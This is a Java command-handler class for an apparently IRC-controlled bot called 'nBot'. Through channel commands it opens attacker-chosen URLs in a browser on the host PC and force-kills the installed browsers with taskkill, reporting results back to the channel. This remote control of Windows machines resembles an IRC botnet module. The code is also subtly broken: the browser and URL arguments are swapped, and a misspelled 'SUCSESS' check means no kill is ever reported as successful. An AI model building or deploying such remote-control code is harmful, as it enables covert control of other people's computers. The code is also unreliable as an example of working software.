
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;

public class Web implements Handler {

    public boolean processCommand(String[] args, String nick) {
        if (args[0].equals(";webopen")) {
            try {
                if (openUrl(locateBrowser(), args[1])) {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Web page opened sucsessfully!");
                } else {
                    IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Web page could not be opened!");
                }
            } catch(Exception e) {
                return false;
            }
            return true;
        } else if (args[0].equals(";closebrowsers")) {
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Trying to close browsers!");
            try {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " "+killBrowsers());
            } catch(Exception e) {
                IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.BLACK + " Could not kill browsers!");
                e.printStackTrace();
                return false;
            }
            return true;
        }
        return false;
    }

    public static String killBrowsers() throws IOException, InterruptedException {
        String[] browsers = {
            "firefox.exe",
            "iexplore.exe",
            "opera.exe",
            "safari.exe"
        };
        StringBuilder sb = new StringBuilder();
        for (String b : browsers) {
            Process exec = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/C", "taskkill /f /im", b});
            exec.waitFor();
            BufferedReader br = null;
            try {
                br = new BufferedReader(new InputStreamReader(exec.getInputStream()));
                String line;
                while ((line = br.readLine()) != null) {
                    if (line.contains("SUCSESS")) {
                        sb.append(b + " killed sucsessfully! | ");
                    } else if (line.contains("ERROR")) {
                        sb.append(b + " could not be killed! | ");
                    }
                }
            } finally {
                br.close();
            }
        }
        return sb.toString();
    }

    public static String locateBrowser() {
        try {
            File file = new File("C:/Program Files/Mozilla Firefox/firefox.exe");
            if (file.exists()) {
                return "C:/Program Files/Mozilla Firefox/firefox.exe";
            }
            file = new File("C:/Program Files/Internet Explorer/iexplore.exe");
            if (file.exists()) {
                return "C:/Program Files/Internet Explorer/iexplore.exe";
            }
            file = new File("C:/Program Files/Opera/opera.exe");
            if (file.exists()) {
                return "C:/Program Files/Opera/opera.exe";
            }
        } catch (Exception f) {
            return null;
        }
        return null;
    }

    public static boolean openUrl(String url, String browser) {
        try {
            String[] b = {browser, url};
            Runtime.getRuntime().exec(b);
            IRC.sendMessage(Config.channel, Colors.BLUE + "[nBot]" + Colors.NORMAL + "Command executed!");
            return true;
        } catch (Exception exc) {
            exc.printStackTrace();
            return false;
        }
    }
}
